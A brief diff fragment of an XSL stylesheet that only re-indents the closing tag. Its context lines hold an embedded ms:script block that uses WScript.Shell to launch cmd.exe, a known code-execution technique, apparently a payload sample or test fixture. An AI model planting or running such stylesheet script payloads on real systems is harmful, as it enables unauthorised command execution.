@@ -8,4 +8,4 @@ version="1.0">
         <![CDATA[
         var r = new ActiveXObject("WScript.Shell").Run("cmd.exe");
         ]]> </ms:script>
-        </stylesheet>
+</stylesheet>
